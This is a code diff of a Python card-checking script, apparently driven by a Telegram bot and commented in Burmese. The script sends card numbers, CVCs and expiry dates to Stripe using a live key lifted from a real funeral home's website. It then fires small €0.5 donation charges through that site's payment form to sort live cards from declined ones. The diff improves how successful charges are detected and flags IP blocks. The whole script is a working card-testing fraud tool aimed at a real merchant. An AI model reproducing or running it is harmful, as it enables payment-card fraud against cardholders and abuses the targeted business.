@@ -47,7 +47,6 @@ def Tele(ccx):
         # ==========================================
         # Step 1: Create Payment Method (Stripe)
         # ==========================================
-        # 🔥 Headers အသစ်
         headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -61,8 +60,7 @@ def Tele(ccx):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
 
-        # 🔥 Payload အသစ် (Key အသစ် pk_live_51IGU...)
-        # Note: မင်းပေးတဲ့ { ,n } ကို { n } လို့ ပြင်ထားတယ်၊ အမှားမတက်အောင်လို့
+        # Note: { ,n } ကို { n } လို့ ပြင်ထားတယ်
         data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'
 
         response = session.post(
@@ -80,7 +78,6 @@ def Tele(ccx):
         # ==========================================
         # Step 2: Charge Request (Corrigan Funerals)
         # ==========================================
-        # 🔥 Corrigan Funerals Headers
         headers = {
             'authority': 'www.corriganfunerals.ie',
             'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -95,7 +92,6 @@ def Tele(ccx):
             'x-requested-with': 'XMLHttpRequest',
         }
 
-        # 🔥 Corrigan Funerals Data
         data = {
             'action': 'wp_full_stripe_inline_donation_charge',
             'wpfs-form-name': 'pay-funeral-account',
@@ -108,12 +104,11 @@ def Tele(ccx):
                 'Street 2',
                 '13125550124',
             ],
-            'wpfs-card-holder-email': random_email, # 🔥 Random Email သုံးလိုက်ပြီ
+            'wpfs-card-holder-email': random_email, 
             'wpfs-card-holder-name': 'Noe Z',
             'wpfs-stripe-payment-method-id': f'{pm}',
         }
 
-        # URL အသစ် /cfajax ကို ပြောင်းထားတယ်
         response = session.post(
             'https://www.corriganfunerals.ie/cfajax',
             headers=headers,
@@ -122,11 +117,19 @@ def Tele(ccx):
         )
         
         # ==========================================
-        # 🔥 ORIGINAL RESULT CHECK (မင်းရဲ့ နဂိုအတိုင်း)
+        # 🔥 IMPROVED RESULT CHECK (Live မလွတ်အောင် ပြင်ထားသည်)
         # ==========================================
         try:
-            # တိုက်ရိုက် message ကိုပဲ ယူမယ် (Success True ဘာညာ မစစ်တော့ဘူး)
-            result = response.json()['message']
+            resp_json = response.json()
+            
+            # ၁။ Success ဖြစ်လား အရင်စစ်မယ် (Live ဆိုရင် Message မပါလည်း Live ပဲ)
+            if resp_json.get('success') == True:
+                result = "Charged 0.5€ ✅"
+            
+            # ၂။ Success မဟုတ်မှ Message ကို လိုက်ရှာမယ်
+            else:
+                result = resp_json.get('message', 'Decline⛔')
+
         except:
             if "Cloudflare" in response.text or response.status_code == 403:
                 result = "IP Blocked by Site ❌"
